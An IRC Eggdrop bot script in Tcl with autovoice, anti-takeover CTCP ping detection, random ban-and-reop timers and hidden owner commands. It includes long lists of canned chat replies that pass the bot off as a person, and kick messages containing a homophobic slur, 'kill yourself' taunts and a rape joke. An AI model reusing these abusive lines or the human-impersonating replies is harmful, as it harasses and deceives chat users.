
# *********************************** #
# * !!DO NOT EDIT BELOW THIS LINE!! * #
# *********************************** #

## voice/devoice active/idle users
#Set the 'number of lines' here after which a user will be voiced
set autovoice(lines) "4"
#Users idling for more than this number of minute(s) will be devoiced.
set autovoice(dvtime) "20"
#Set the time here in 'minutes' after which you would continuously like to check
set autovoice(dvcheck) "10"

bind pubm - "*" autovoice:users
bind ctcp - ACTION autovoice:users2
proc autovoice:users2 {nick host hand chan keyword arg} { autovoice:users $nick $host $hand $chan $arg }
bind join - "*" autovoice:erase:record
if {$autovoice(dvtime) > 0} {bind time - "*" autovoice:devoice:idlers}

proc autovoice:users {nick uhost hand chan text} {
 global autovoice voice
 if {![botisop $chan] || [isbotnick $nick] || [isop $nick $chan] || [isvoice $nick $chan] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {![info exists voice($user)] && ![isvoice $nick $chan] && ![isop $nick $chan]} {
   set voice($user) 0
 } elseif {[info exists voice($user)] && ([expr $voice($user) + 1] >= $autovoice(lines)) && ![isop $nick $chan] && ![isvoice $nick $chan]} {
   utimer 3 [list autovoice:delay $nick $chan] ; unset voice($user)
 } elseif {[info exists voice($user)]} { incr voice($user)}
}
proc autovoice:delay {nick chan} {
 set user [split [string tolower $nick:$chan]]
 if {[botisop $chan] && [onchan $nick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan] && ![string match "Guest*" $nick]} { pushmode $chan +v $nick ; set voiced($user) 1 }
 if {[info exists voiced($user)]} { pushmode $chan -k 14a4çtive.14ç4hatter ; flushmode $chan }
}
proc autovoice:erase:record {nick uhost hand chan} {
 global autovoice voice
 if {[isbotnick $nick] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {[info exists voice($user)]} { unset voice($user) }
}
proc autovoice:devoice:idlers {m h d mo y} {
  global autovoice
  if {([scan $m %d]+([scan $h %d]*60)) % $autovoice(dvcheck) == 0} {
  set chans [string tolower [channels]]
  foreach chan $chans {
	  if {[botisop $chan] && [string match "*+active*" [channel info $chan]]} {
        foreach user [chanlist $chan] {
          set user [string tolower $user]
          if {[botonchan $chan] && ![isbotnick $user] && ![isop $user $chan] && [isvoice $user $chan] && ([getchanidle $user $chan] >= $autovoice(dvtime)) && ![matchattr $user f] && ![matchattr $user v]} {
              pushmode $chan -v $user
              if {![info exists devoice($chan)]} { set devoice($chan) 1 }
            } else { continue }
        }
        if {[info exists devoice($chan)]} { pushmode $chan -k 14d4epøis.14f4ør.14i4dle ; flushmode $chan }
} } } }
putlog "Active Chatter v3.75.b by awyeah edited by F4R1S has been loaded successfully."

## anti take over ping  ##
bind ctcr - PING xactr
proc xactr {nick uhost hand dest key couk} {
  global botnick pingchan wait_ping notb basechan owner notc bannick
  catch {unset wait_ping}
  if {$nick==$botnick} {return 0}
  if {[string match "*a*" [string tolower $couk]] || [string match "*i*" [string tolower $couk]] || [string match "*u*" [string tolower $couk]] || [string match "*e*" [string tolower $couk]] || [string match "*o*" [string tolower $couk]]} {
    if {[string match "*adduser*" [string tolower $couk]]} {
      putquick "PRIVMSG $basechan :\001ACTION Detecting14 ${nick}($uhost) Using ctcp ping e4X14ploit To Hack Me.\001"
      foreach x [channels] {
        if {[onchan ${nick} $x]} {
          if {[botisop $x]} {
            set bannick($nick) "$uhost" ; putquick "KICK $x ${nick} :$notc 4!14lamer4! 14ctcp ping e4X14ploit14 frøm4 ${nick}($uhost) [banmsg]"
            } else {
            if {![string match "*c*" [getchanmode $x]]} { putquick "PRIVMSG $x :\001ACTION Detecting14 ${nick}($uhost) Using ctcp ping e4X14ploit To Hack Me.\001" } { putquick "PRIVMSG $x :\001ACTION Detecting ${nick}($uhost) Using ctcp ping eXploit To Hack Me.\001" }
            foreach c [chanlist $x f] { if {[isop $c $x]} { set sendspam "!kick [zip "$x ${nick} $notc 4!14lamer4! 14Ctcp Ping e4X14ploit14 frøm4 ${nick}($uhost) 14-repørt by4 $botnick-"]" ; putsrv "PRIVMSG $c :$sendspam" } }
      } } }
      newignore "${nick}!*@*" F4R1S ctcp-hack 1 ; putlog "$notc 1 minutes ignoring ${nick} for ctcp e4X14ploit"
    }
    return 0
  }
  if { $key != "PING" } {return 0} ; set pingtime [expr [unixtime] - $couk]
  if {[info exists pingchan]} { if {![string match "*c*" [getchanmode $pingchan]]} { puthlp "PRIVMSG $pingchan :$nick, 14pOng4! 14(6$nick14)06 $pingtime 14second(s)4!" } { puthlp "PRIVMSG $pingchan :$nick, 14pOng4! 14(6$nick14)06 $pingtime 14second(s)4!" } ; unset pingchan }
  return 0
}
################## STAR DESYN ##################
proc br_resync {} {
  global botnick
  foreach chan [channels] {
    if {[onchan $botnick $chan]} {
     if {[botisop $chan]==1} {
      set Mode "[rw]@$chan"
      putserv "MODE $chan +b-o+o+n+t-b $Mode $botnick $botnick $Mode"
     }
    }
  }
  if {![string match *br_resync* [timers]]} {
    timer [expr 40 + [expr [rand 30] + [expr [rand 10] + [rand 20]]]] br_resync
  }
  return
}

if {![string match *br_resync* [timers]]} {
  timer [expr 40 + [expr [rand 30] + [expr [rand 10] + [rand 20]]]] br_resync
}
putlog "Loaded welcome.tcl"

set bancounter {
  "13Secure Kick1..!" "10Failure1..!" "10BaNnEd1..!" "10Out From Channel1..!" "13Justice Kick1..!" "10Anti Lamer1..!" "13No Comments1..!" "..4Lamer.."
  "..4Out 4From 4Channel.." "..4Justice 4Kick.." "..4Anti 4Lamer.." "..4Secure 4Kick.." "..4Enemy 4Kick.." "..4No 4Comments.."
  "..4Slow 4Kick.." "..4Smart 4Kick.." "..4Do 4Not 4Come 4Back 4Again.." "..4You 4Are 4In 4My 4Enemy 4List.."
  "..4What 4You 4See 4Is 4What 4You 4Get.." "..4No 4Problem.." "..4Killing 4Zone.." "..4Script 4Error.." "..4Illegal.."
  "..4Failure.." "..4Fair.." "..4Retry.." "..4Bandit.." "..4Terorist.." "..4Kick.." "..4No 4Reason.." "..4Join 4Again.." "..4War 4Zone.."
}
set querym {
  "hai juga" "halo" "apakabar" "asl dong" "haiiii" "siapa ya" "lagi dimana ?" "haloooo" "apa kabar" "siapa ya ?" "yup" ":-)" "no pv pls x(" "ya ada apa?"
  "aha!" "capa ini imut sekali :P" "mojok yuk" "kangen.." "d0r!" "dari mana?" "dah lama cetingnya?" "jam brp skrng?" "woi balikin clana dalem gw!!"
  "O.o" "Kantong menyan lo ko gede sebelah" "godain qta donk ^-^" ":(" "(-_- )" "wb wb" "koq baru keliatan?" "woii" "slamat ceting" "hehe si jelek"
  "apa tayank" "napa?" "-_-`" ":):)" "..." "suiitt suiitt.." "suiitt suiitt.. plok plok" "yuhuu" "loh?" "hah?" "dasar" "ga laper lu?" "Hi too.."
  "minta pelmen bon bon dunk, hikz" "apaan tuh" "minta fs dong" "nomer hp kamu brapa ?" "imel kamu apa?" "cari siapa? " "hai hai molo, gw cium baru tau"
  "yes?" "jelek lu" "nah nah" "kenalan yuk" "berpelukannn!" "i miss u" "blom pernah diperkosa 1 RT loe?" "ooee" "ingat bayar hutang besok ya"
  "??" "^.^" "mmuuwaa" "ngantuk ya?" "epon gw besok okey ^^" "-_-`" "na na iguana" "sapa niy?" "hanih..." "weeeii!" "hihi" ":P" "eh dul" "No pv!"
  "ehemm.." "(= ^ _ ^ =)" "pasti mo gebetan lagi" "na na na iguana" "yup" "ya?" "oit" "napa?" ":)" "^^" "O.o" "o.O" ":P" "cuek" "where are you from?!"
  "apaan sich?" "bete tau dipanggil molo" "kamu sapa?" "wekz" "wakz" "sapa ya?" "sorry ga kenal" "iya tayank" "wew" "dudulz" "igh lucu na" "what do you need?"
  "kamu cakep ga?" "sapa ni, nalan dolo donk" "GggRrr.." "mo ga gw jitak?" "knp dul?" ">.<" "eiiitt.." "nah nah" "beuh" "hushh hushh :P" "Maaf lagi jadi bot ni"
  "dah mandi belom ?" "brisik! :P" "nungging lo!" "ketik C spasi D Cape Deeee" "weQs~" "Ada co nggak yach ??" "hah?" "d0r!" "sssstt..." "???" "Hai, asl dong"
  "^^" ":)" ":):)" ":P" "kangennnn" "miss uuuuu" "hayahh" "wei, ngapain teriak2" "brisik! :P" "kemana aja ko baru keliatan ?" "whats up?!" "whats cookin'?"
  "whatcha up to? :))" "hey! hows ya??" "hows ya!?" "hows ya?, mate!" "how r u" "how are you doing?" "how r u?" "howdie? :x" "howdie? mate!" "hows ya doin?"
  "hows ur gf doing?" "hows you doin?" "whats cookin' mack!? :p" "how how, how are you brown cow?" "whats your name?!" "what have ya been upto? eh?"
  "how are you?" "where ya from!?" "hows ya been doin? :)" "a/s/l?" "what do ya do??!" "whats ur name?" "whats ya name? :/" "where do you live?" 
  "how old are ?" "how old r u?" "a/s/l? plz" "are u m/f?" "m or f?" "male or female?" "male/female?" "asl plz" "asl please :)" "how r u doing?"
  "how r you?" "how are u?" "a/s/l please!" "how have u been? :D" "where did u go?" "what do you do?" "what do u do?!" "how can i help you?!" 
  "what do ya want!" "what do you want?" "do you know me?!" "do i know you?" "do u know me?" "do i know u? hmm" "have we talked before?!" "have we met before?"
  "Hi, How are you?" "Hi, How are u today?" "yeah? what's up?" "what's up doc?" "Hi too, asl pls.." "what's up?" "sorry, i'm very busy right now.."
  "yeah? who are you?" "do i know u?" "yeah? do i know u?" "who the hell are you?" "i'm curently away, may be later.." "where u came from?" "Pasti gak tau kalo Gue bot :D"
  "yeah, nice to meet u.." "nice to meet u.." "what is ur real name?" "yeah? asl pls.." "i'm curently busy, may be later.." "Sori lagi ga bisa ngobrol nanti aja ya"
}
set cyclem {
"Auto Recycle!" "Looking for Inviter!" "In/Out!" "Rehashing!" "Refreshing!" "Doing Cycle!" "Inviter Suspect!" "Looking for Suspect!" "Regain Inviter!" "Regain Suspect!" "Recycle!" "Cycle Needed!" "Cycle all Channel!" "Cycling!" 
"Inviter Detected!" "Full Cycle Ahead!" "Going Out and Back!" "I can do this all day!" "Cycle Time!" "I will do this all day!" "Time to Kill!" "No day without cycle!" "yuhuu.. where are you?" "It's a good day to die!" "Time for cycle!"
"License to Kill!" "Cycle.. cycle.. and cycle.." "I need suspect!" "Need For Suspect!" "Time's up!" "No way out!" "No more left!" "No regret for inviter!" "Hot Pursuit!" "Rule No.96: Cycle!" "Critical Cycle!" "Pursue Inviter Suspect!" 
"Go To Cycle!" "Cycle System Running!" "Cycle Strike Back!" "I need cycle now!" "((((cycle))))" "14ReJoIN" "14ReHaSH" "14ReLoAD" "14ReFReSH" "14IN/OuT" "14P-A-T-R-O-L" "14S-E-A-R-C-H"
}
set partm {
  "BaCk To BaSe" "owner Request! Sorry :P" "Ups! Wrong Channel!" "Be Right Back!" "No one Join Forever!" "Damn! Wrong Channel!" "Access Denied!" "Return To Base!"
  "Access Rejected!" "Going Back!" "Ilegal Channel!" "Going Home!" "Good Bye!" "Sayonara!" "Ups! Wrong Room :P" "Got To Go!" "Goodbye! Ugly :P" "Go To Hell!"
  "Going Somewhere!" "No Join Today!" "It's a bad day to join :P" "Part Never Die!" "Join Another Day!" "License To Part!" "'Part' time!" "Time To Go!"
  "Too many join channel :P" "This Join is Not Enough!" "Join too many channel :P" "It's time to Go!" "It's time to Part!" "Part for now and Forever!" "Part Forever!"
}
set awaym {
"Jalan Jalan" "Not Here" "Check Imel" "Cari Target" "Offline" "On Position" "Auto-Away after 10 mins" "Belajar" "Tilawah" "Kerja" "Not At My Desk" "Baca Buku" "Lagi Maem..." "Sibuk" "Tiduran" "Masak Mie" "Lagi Mancing" 
"Zzz..ZZz.." "Online" "Support.By.iJoo.oRg"
}
set rms {
  "By.\0030,1iJoo\003.oRg!in" "By.\0030,2iJoo\003.oRg!in" "By.\0030,3iJoo\003.oRg!in" "By.\0030,4iJoo\003.oRg!in" "By.\0030,5iJoo\003.oRg!in" "By.\0030,6iJoo\003.oRg!in" "By.\0030,7iJoo\003.oRg!in"
  "By.\0030,8iJoo\003.oRg!in" "By.\0030,9iJoo\003.oRg!in" "By.\0030,10iJoo\003.oRg!in" "By.\0030,11iJoo\003.oRg!in" "By.\0030,12iJoo\003.oRg!in" "By.\0030,13iJoo\003.oRg!in" "By.\0030,14iJoo\003.oRg!in"
  
}
set kickms {
  "I'm only doing this because I care.." "skin and bones, blood and teeth, well this is essentially who we are" "I recommend you see a therapist.." "Everyone will suffer now, you can't save yourself!"
  "I'm too lazy to give you a real message.." "This random kick is brought to you by kick master !!" "You Have Underestimated The Dark Side ! Now You Must Die !" "-(!)- CRASH -(!)- Ouch ! Thats Gotta Hurt Mr Pancake !"
  "E=mc2 = F/(s^2) = (x-y3*2,03)" "Yuch ! What A Stinch !" "Not Going To Sit For A While ?" "Well Aren't You Answering Me ?" "Thanks I Needed These !" "Come Back When You Can Breath !" "This random message was censored by popular request.."
  "Ohh Isn't That Love Between Man And Animal So Cute !" "Damn I Got Brains All Over Me !" "SHUU !! You Are Dead !" "Man What A NutCase !" "-> Caught You Looking ! <-" "That Was A Nice Try Kid" "Look! A Talking BungHole!"
  "This is our subtle way of saying goodbye" "-> Kiddie Kick <-" "I Am Doing It, YES ! (Phew Was Close Again)" "We Don't Like Faggots Here !" "Hey SHUT THE FUCK UP !" "Buh Bye Then !" "#lamers is a better place for you"
  "|¯| <- there's the exit" "Lamer Shields Activated !" "This Is My Last Option" "Do You Want to See the Bed in Flames?" "You believe it would be hard to kill, But where are all of the dead coming from?" "Sex is a Battle, Love is War..."
  "I'm not sorry, this is what you deserve!!" "Run, run for your lives..." "You, in the schoolyard, I am ready to kill You..." "My black blood and your white flesh..." "The cold sweat on your white forehead, hails into my sick brain..."
  "I will $always become hornier from your screams..." "Your White Flesh Excites Me So..." "I'm Just a Gigolo..." "My father was exactly like me..." "Your White Flesh Enlights Me..." "Warm body, hot cross, wrong judgment, cold grave..."
  "I will return in ten days, as your shadow, and I will hunt you down..." "Ashes to ashes, and dust to dust..." "I follow you, I find you, I touch you, And Now, I have you..." "Never again, the old sorrow..." 
  "Save each other from being in pairs..." "A man is burning..." "The smell of flesh lies in the air..." "A child is dying..." "A sea of flames..." "Blood is coagulating on the asphalt..." "Boo-hoo"
  "...and there was much rejoicing.." "A pity you have to leave so early" "Absence makes the heart grow fonder" "All for one, and one for all." "And now eat my poo-poo" "And now the final scene, a global darkening..."
  "Any fool can make a rule and every fool will mind it." "Are you real??? No....I think not!!! I'm sure!!!" "Mothers are screaming..." "A mass grave..." "Armegeddon is here, like said in the past." 
  "Burning in my brain, I can feel the pain." "No escape..." "No birds are singing anymore..." "The sun is shining..." "God knows I don't want to be an angel..." "You have asked me, and I have said nothing..."
  "Can you break hearts?" "Can hearts speak?" "Can you torture hearts?" "Can you steal hearts?" "Can hearts sing?" "Can a heart burst?" "Can hearts be pure?" "Can a heart be made of stone?" "Can you ask hearts?"
  "Can you carry a child under yourself?" "Can you give it away?" "Can you think with your heart?" "They want my heart on the right spot, but then I look below, it beats left there..." "Left two three four left!"
  "One, two, three, four, five, six, seven, eight, nine, out..." "And the world counts loudly to ten" "Here comes the sun..." "Can you hear me? Can you see me? Can you feel me? I don't understand you..." 
  "I wait for you, at the end of the night..." "Whats That Red 15 Meter Long Rope Back There ?" "Can i get a goal from it?" "Congratulations, You got kicked !!!" "The OP is $always correct" 
  "No animals allowed, sorry, please join pet !!" "Popular Request !!!" "Random Kick Message" "Ultimate, powerful, Exccesive, Super, Deluxe, Large, Big Lamer Detected" "I am a hunter, I'm hunting lamers"
  "Reminder:We aren't no friends anymore" "I'm doing this because you suckssss" "World Guiness Record you were kicked 999999999 a day !!!" "mode +su means SHUT UP!!" "Viruses Kicked, Channel Clean !!"
  "Do not give opinions or advice unless you are asked" "Do not tell your troubles to others unless you are sure that they want to hear them" "When in another's lair, show him respect or else do not go there"
  "If a guest in your lair annoys you, treat him cruelly and without mercy" "Do not make sexual advances unless you are given the mating signal" "Do not take that which does not belong to you unless it is a burden to the person and he cries out to be relieved"
  "Acknowledge the power of magic if you have used it successfully to obtain your desires. If you deny the power of magic after having called upon it with success, you will lose all you have obtained"
  "Do not complain about anything to which you need not subject yourself" "Do not harm little children" "Do not kill non-human animals unless attacked or for your food" "When walking in open territory, bother no one. If someone bothers you, ask him to stop. If he does not stop, destroy him"
  "Error:Illegal Kick Operation !!!" "This is a speed test for IRC Kick Engines!!!" "Fly without wings" "You're a real bad lamer" "We're tire of your silly attitude" "You are not eligible to join here, less morality !!!"
  "This channel is not for lamer's !!" "Better to go like this or else, you will lose your head in reality !!" "Make an appoinment in some other day" "angry? So What !"
  "Is it painful? Go get a doc !!!" "Your violence entertain me, EAT THIS !!" "I know you will love this" "Ohhh you are out !!!" "Go sit at a corner" "rubbish is YOU !!"
  "YOU FORCE ME" "Any fool can make a rule and every fool will mind it" "Eye for eye, tooth for tooth, hand for hand, foot for foot" "All for one, one for all" "Are you feeling lucky????"
  "Did you hear something?" "Another spammer meet the foot-face" "Tell me what you've got" "Please, do not S*P*A*M*M*I*N*G!!" "Out, damn spot, out I say!" "I can hear somebody FELL in the blank!"
  "Can somebody stop this guy???" "Perhaps you should try real life for awhile" "okluvyabubye" "*blam!* yeah, beeyaaaach I poped a cap in yo' ass!" "Another spammer meet the foot-face - [o]"
  "eeeeeeeekkkkkkkk!" "Out!!" "U hurt my ears , my eyes , my felling and u`re OUT !!" "From Heaven With Love" "Heaven And Earth And You go to moon" "Ups!!" "Sorry but u`re not allowed being here"
  "U like my new shoes ?!" "No reason :Pp~" "Kick Kick Kick Kick Kick Kick" "Can't do nuttin with that" "Testing Testing" "Isit hurt ?!" "Lamer deteçted" "Uncool not allowed" "Request - Request"
  "Go!!" "Are You there ?¿?" "asl pls :P~" "Last warning now hush!!" "Confucius say If you can't shut up here, speak elsewhere" "Eat this!!" "Jump or die!" "And should we really care?" "If you're fighting to live, It's ok to die!"
  "No escaping pain, you belong to me" "I need a ride to the morgue, that's what 911 is for" "That doesn't kill me, only makes me stronger" "Forgive me father, for I have sinned" "Lie, steal and cheat, a real bad guy!"
  "Pull over, shithead, this is the cops!" "Rot in hell, it's time you know your master, off you go!" "Excess Lameness" "Killed (Mom (Don't hang around with them! They're troublemakers!)"
  "Come back when you've finally learned not to be lame" "Congratulations, you won a brand new kick!" "Crash! Boom! Bang!" "Cya later - much later" "Death greets me warm, now I will just say goodbye."
  "Death in the air, strapped in the electric chair." "Choose your fate and die!" "You've been dying since the day you were born" "You know it has all been planned" "Now there's nothing you can do"
  "Cya, Wouldn't wanna be ya" "Thanks for leaving, come back soon!" "He winds up and your out" "YOUR FIRED!!!" "There is the kick And It's GOOD!" "What to expect in upcoming versions" "More commands*"
  "Any suggestions submitted*" "Any fixes for bugs in pervious version(s)*" "Updated kicks files*" "Only In Sadness Comes Awakening" "Not enough memory to display" "Another one bites the dust"
  "No Such Nick/channel" "Damm, I'm good" "I think I will have another beer" "that's all i have to say about you" "There's a better place for you; But it´s far, far away" "If you think that f*ck is funny, f*ck yourself and save your money"
  "Kenny doesn´t want to die!!" "Yo momma so ugly the government moved Halloween to her birthday" "Yo momma so stupid she watches teletubbies and takes notes" "Mess with the best die like the rest"
  "This isn´t BitchX baby!" "Yo momma so stupid she sits on the TV, and watches the couch" "Yo momma so bald that she took a shower and got brain-washed" "Kyles momma is a stupid bitch!"
  "Here comes the sun" "We're going to have a problem here" "May I have your attention please? Will the real Slim Shady please stand up?" "I'm Slim Shady" "Yes I'm the real Shady All you other Slim Shadys are just imitating So won't the real Slim Shady Please stand up"
  "Eyes of glass stare directly at death." "Fall to your knees, and bow to the Phantom Lord." "Fight fire with Fire, bursting with fear." "Fight fire with fire, the ending is near."
  "For now you've got some company." "Freezing, can't move at all" "From deep sleep I have broken away." "Frozen soul, frozen down to the core." "Eye for eye, tooth for tooth, hand for hand, foot for foot."
  "Another spammer meet the foot-face" "Tell me what you've got..." "Please, do not S*P*A*M*M*I*N*G!!" "I came, I saw, I conquered. (Veni, Vidi, Vici)" "Can u stop giving me BULLSHIT?"
  "Out." "damn - i cant stop this guy. i have no choice... :P" "bitch you spamming to me!! get lost!!" "I'm too lazy to give you a real kick message"
  "Spamminng is not allowed" "((Killed (stats.dal.net (User has been banned from DALnet ([ma/inv] Mass Messaging / Inviting is not allowed on DALnet. See http://kline.dal.net/massads/mup.htm) [AKILL ID:1013974367K-c]))))"
  "Next motherfucker gonna get my metal..." "Goddamn your righteous hand..." "You cannot sedate all the things you hate..." "Light a candle for the sinners, set the world on fire!" "How does it feel to be one of the beautiful people?"
  "Everyone will suffer now, you can't save yourself!" "When you are suffering, know that I have betrayed you..." "This isn't me, I'm not mechanical..." "Don't blow your fuckin mind!!" "No salvation, no forgiveness..."
  "The president is dead, let us pray..." "I got my lunchbox and I'm armed real well..." "Someone had to go this far..." "Getting high on violence, baby..." "You may as well kill yourself, you're already dead..."
  "You're just a copy of an imitation..." "I'm not sorry, this is what you deserve..." "Do you love your guns, your god, and government?" "This is beyond your experience!" "YOU CAN'T KILL ME MOTHERFUCKER!!"
  "ALELUIA MOTHERFUCKER!!" "Got a kick in the ass... fuckin asshole" "Nothing more beatifull than one ass out of this channel" "Kick kiry ki ky... OUT SUCKAAA" "Sometimes there is no other solution"
  "Now there's nothing you can do." "Now you've got the fight of your life." "Nuclear warfare shall lay us to rest." "Oops, I did it again" "Why tha fuck were you still here!!!???" "Nope - no wrong button" "You really wanted it, right?"
  "You're falling in a bottomless pit of loneliness" "See you in hell" "So gather round your warriors now and saddle up your steeds." "Sound is ripping through your ears." "Take a look to the sky just before you die."
  "Pimp your brain" "Mr. Mighty ass has left tha building!!!!" "Relaxation is tha key for staying in this chan" "Goodbye ass face... YES... ASS FACE!!!" "Here you are... found ya!!!!" "Sorry, but you are dismissed"
  "You must have been an ass in your other life!" "Get of my face ASSHOLE!!!" "Hello, Hello...No Answer!!!" "Excuse me...I´d like to ASS you a few questions!!!" "Pissing me off is one of your skills"
  "You really don´t belong here!!! Fuck off!!!" "You're not welcome here" "Ui Ui...What a kick...100% done!!!" "Don´t fuck with me... Get out sucker!!!" "Mess with the best...get kicked like the rest!!!"
  "Are you real??? No....I think not!!! I´m sure!!!" "ah...ahh...ahhh...bahHAHhahHAHhahahHAHhah...Got kicked!!!" "Mode +q... Means QUIET!" "Well well well... Nasty nasty boy... Fuck off"
  "Go and check http://www.microsoft.com... Lhamer..." "It´s for ppl like you they invented tha word KICK..." "Just relax and come back in a week..." "LAAHAHA LHAHAHAHAH LAAHAHAHAHAH... Fuck off... Leave the planet!!!"
  "Die with a fuckin brain tumour..." "Don't fuck with me... Get out sucker!!!" "I advise you to go and hide yourself somewhere..." "There are many things you should think about... IRC isn´t one of those..."
  "Jerky assholes like you... should go and... well... fuck you" "Guess what I´m thinking about? --- The best way to not seing you anymore..." "Guess who's back! back again!!! :)"
  "Guilty as charged, but damnit it aint right!" "Hear the Cry of war." "What doesn't kill you, makes you stronger" "Have you considered suing your brains for non-support?" "I bet your brain feels as good as new, seeing that you've never used it."
  "Keep talking, someday you'll say something intelligent." "There is no vaccine against stupidity." "Since the speed of light is faster than the speed of sound, is that why some people appear to be bright until you hear them speak?"
  "Go away!" "I love pressing this button" "Go play leapfrog with a unicorn" "Where do you wanna go today? Out... Ok!" "I rather want you to stay at teletubbies.com" "Yes, I have OP ;)" "You didn't understand any of this."
  "Get lost!" "You just laughed, ha ha, bitch." "Don't get lost in thought, you'll be a total stranger there." "If you said what you thought, you'd be speechless." "I wish I had a lower I.Q. so that I could enjoy your company."
  "I'm not going to get into a battle of wits with you, I never attack anyone who's unarmed." "It's too bad stupidity isn't painful." "Id explain it to you, but I dont have any crayons with me."
  "Are you $always this stupid, or are you making a special effort today?" "Do we have a learning disability here?" "I see no sign of intelligence anywhere..." "ââ©â(â£_â¢)ââ©â"
  "I see dumb people... they're everywhere. They chat in IRC like everyone else. They don't even know that they're dumb." "A guy with your IQ should have a low voice too!" "Any similarity between you and a human is purely coincidental!"
  "Are you $always so stupid or is today a special occasion?" "As an outsider, what do you think of the human race?" "I'd like to kick you in the teeth, but why should I improve your looks?"
  "At least there's one thing good at your body. It isn't ugly as your face!" "Brains aren't everything. In fact, in your case they're nothing!" "Careful now, don't let your brains go to your head!"
  "I like you. People say I have no taste, but I like you" "Did your mother have any children that lived?" "Did your parents ever ask you to run away from home?" "I want nothing out of you but breathing, and very little of that!"
  "Take off that mask! Don't you think it's a little early for Halloween?" "Don't be ashamed of wat you are. I'm not ashamed of what you are!" "If I had a face like yours. I'd sue my parents!" "Don't feel bad. A lot of people have no talent!"
  "Don't get insulted, but is your job is devoted to spreading ignorance?" "Keep talking, someday you'll say something intelligent!" "Don't mind him. He has a soft heart and a head to match." "Don't you love nature, despite what it did to you?"
  "Don't think, it may sprain your brain!" "people like you don't grow from trees; they swing from them." "you have mechanical mind. Too bad you forgot to wind it up this morning." "you have a mind like a steel trap -- $always closed!"
  "You are a person of the world -- and you know what sad shape the world is in." "your $always lost in thought -- it's unfamiliar territory." "your dark and handsome. When it's dark, iam handsome." "your known as a miracle comic. if your funny, it's a miracle!"
  "your listed in Who's Who as What's That?" "your living proof of that a person can live without a brain!" "your so short, when it rains your $always the last one to know." "you are the kind of a person of people would use as a blueprint to build an idiot."
  "Here's 20 cents. Call all your friends and bring back some change!" "How come you're here? I thought the zoo was closed at night!" "How did you get here? Did someone leave your cage open?" "How much refund do you expect on your head -- Now that it's EMPTY."
  "How would you like to feel the way you look?" "Hi! I'm a human being! What are you?" "I can't talk to you right now; tell me, where will you be in ten years?" "I don't want you to turn the other cheek. It's just as ugly."
  "I don't know who you are, but whatever it is, i'm sure everyone will agree with me." "I don't know what makes you so stupid, but it really works!" "I could make a monkey out of you, but why should I take all the credit?"
  "I can't seem to remember your name, and please don't help me!" "I don't even like the people you're trying to imitate!(if you are at all!)" "I bet you have a loud bark!" "I know you were born silly, but why did you have a relapse?"
  "I know you're a self-made man. It's nice of you to take the blame!" "I know you're not as stupid as you look. Nobody could be!" "I've seen people like you, but I had to pay admission!" "Id explain it to you, but I dont have any crayons with me"
  "Her lips suck forth / see where it flies" "It's been nice knowing you.. well actually, it hasn't" "Support Dan Quayle for President!" "This random kick message was censored by popular request" "And quoth the raven Nevermore"
  "POP goes the weasel..." "Trying to establish a new kick record..." "Look, no more lamer ^^" "There's the exit, learn it well" "This relationship just isn't going to work out" "The op is $always right" "You are frightening our customers, we must ask you to leave"
  "Random Kick Message #13" "Excuse me...I'd like to ASS you a few questions!!!" "Excessive lameness deteçted" "Shhh... Be vewy vewy qwiet... I'm hunting lamers..." "My foot itches... ahh... much better..." "Silly customer, you cannot harm the Twinkie!"
  "Would you like fries with that?" "P.S. This doesn't mean we can't be friends" "If you have to ask, you'll never know" "This kick was sponsored in part by Microsoft Combat Boots" "It must be a monday... -sigh-"
  "Lamer removal successful!" "Oh! Oh! Kick me again!" "That's gotta hurt!" "The fist of terrors breaking through." "Boot to the head!" "The Phantom Lord has NEVER failed." "It's for ppl like you they invented tha word KICK..."
  "It's not that I hate you, its just.. that I dont like you" "It's the beginning of the end." "Its the last time you will!" "Anger is a tool, only for one's opponents" "Error processing request, please try again"
  "Go go gadget army boot!" "...and there was much rejoicing..." "This is a test of the Emergency IRC Kicking System" "My Karma just ran over your Dogma" "People these days won't take responsibilty for anything...but don't quote me on that"
  "Silly rabbi, kicks are for trids!" "Look at that lamer fly!" "Another one bites the dust..." "hehehe, that kickles" "Yes, I have ops" "Thank you, please drive through" "Einstein said We'll use rocks on the other side"
  "Emptiness is filling me, to the point of agony." "Enough for today rookie" "Everybody be cool, YOU - be cool" "Don't let the door hit you on your way out" "I'll see you in my office tomorrow at noon" "*snap* *crackle* *pop*" "Why me?"
  "Waste your time wherever you want, but not here" "Why not?" "*bang bang* you're dead" "Violence is never a solution, but it can be entertaining" "Thanks for your visit" "Thank you for NOT smoking!" "I recommend you to see a psychologist."
  "I wonder what this button does?" "Im tired of your company. Begone!" "Lame and fake - that's you" "I know you like it when I do this" "IIII can't HEAAAAAAAR you!" "Talk to the foot!" "Testing... Worked." "Are we having fun yet?"
  "I tire of your company. Begone!" "Insufficient maturity deteçted" "Leather and metal are our uniforms, protecting what we are." "Look behind you, a three-headed monkey!" "My channel, my rules" "No Homers" "I would ask you to leave, but why, when I can force you?"
}

set msgcoms { "op" "deop" "voice" "devoice" "join" "part" "chan" "kick" "kickban" "ban" "auth" "passwd" "invite" "owner" "admin" "master" "friend" "chattr" "cycle" "access" "tsunami" "rehash" "reset" "identify" "server" "deluser" "die" "restart" "ignore" }
bind msg Z dc msg_dc ; proc msg_dc {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc decrypt: [decrypt 64 "$rest"]" }
bind msg Z ec msg_ec ; proc msg_ec {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc encrypt: [encrypt 64 "$rest"]" }
bind msg Z zip msg_zip ; proc msg_zip {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc zip: [zip "$rest"]" }
bind msg Z unzip msg_unzip ; proc msg_unzip {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc unzip: [dezip "$rest"]" }
bind msg Z lines msg_lines ; proc msg_lines {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc lines: [lines "$rest"]" }
bind msg Z ddl msg_ddl ; proc msg_ddl {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :$notc dezip+dcp+lines: [dezip [dcp [lines "$rest"]]]" }
